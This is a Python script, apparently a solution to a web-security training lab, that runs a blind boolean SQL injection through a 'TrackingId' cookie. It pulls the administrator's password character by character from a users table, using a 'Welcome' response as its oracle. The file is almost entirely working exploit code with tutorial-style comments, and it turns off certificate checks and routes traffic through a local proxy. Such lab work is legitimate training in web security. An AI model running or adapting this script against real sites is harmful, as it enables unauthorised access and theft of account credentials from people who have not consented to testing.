import sys
import requests
import urllib3
import urllib

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http': 'http://127.0.0.1:8080'}


def sqli_password(url):
    password_extracted = ""
    for i in range (1,21): #This is the range/length of our password, and so if our password length was 20, we would have to make it 1 bigger.
        for j in range(32,126): #This is the actual chracters we want to try to enumerate. Now the reason we have 32-126, is because if we were to look at an ASCII Table, we would realise that from 32 to 126, thats every number, special character, and letter capitalized and non-capitalized. This way, instead of having all of them written in an array, we can just convert them to ASCII because Python supports it.
            sqli_payload = "' AND (SELECT ascii(SUBSTRING(password,%s,1)) FROM users WHERE username='administrator')='%s'--" % (i,j) #Here we'll input the syntax/payload we're wanting to use, and we're also going to add a function to convert that 32-126 range to ASCII for us. Also, thats where i,j come in, from the ranges, as thats whats being inputted into the sqli_payload.
            sqli_payload_encoded = urllib.parse.quote(sqli_payload) #URL Encoding our payload.
            cookie = {'TrackingId': "PVN41BMiVyxvEyZh" + sqli_payload_encoded, 'session': 'HCcaXrKqlvqyy4IZtXqc54bOR15uKb5o'} #This cookie variable is where are actual payload is going, as that was where the vulnerable parameter was located. We have to make sure we also include the session and TrackingId.
            r = requests.get(url, cookies=cookie, verify=False, proxies=proxies)

            if "Welcome" not in r.text:
                sys.stdout.write('\r' + password_extracted + chr(j)) #Starts printing out the charachters its currently attempting, and once it finds the correct one, it moves/breaks onto the next one, thanks to the else statement.
                sys.stdout.flush()
            else:
                password_extracted += chr(j)  #This is adding whatever character was returned with the "Welcome Back!"" message, to the empty password_extracted variable we set earlier.
                sys.stdout.write('\r' + password_extracted)  #This is writing out that "password_extracted" variable.
                sys.stdout.flush() #This is flushing the data that was buffered with the stdout statement we just used above^, as that data gets saved to memory, so we want to flush it out every time, to make space for the new data we'll be writing, so it can visible in real-time.
                break #What this else function is doing is, it ensures once we do get a "Welcome Back!" message, theres no need to try all the different characters because we already found the character for that position. Thats what the break is for. Something even Burpsuite doesnt have.



def main():
    if len(sys.argv) != 2:
        print("[-] Usage: %s <url>" % sys.argv[0])
        print("[-] Example: %s www.example.com" % sys.argv[0])


    url = sys.argv[1]
    print("[+] Retrieving administrator password...")
    sqli_password(url)


if __name__ == "__main__":
    main()




        
    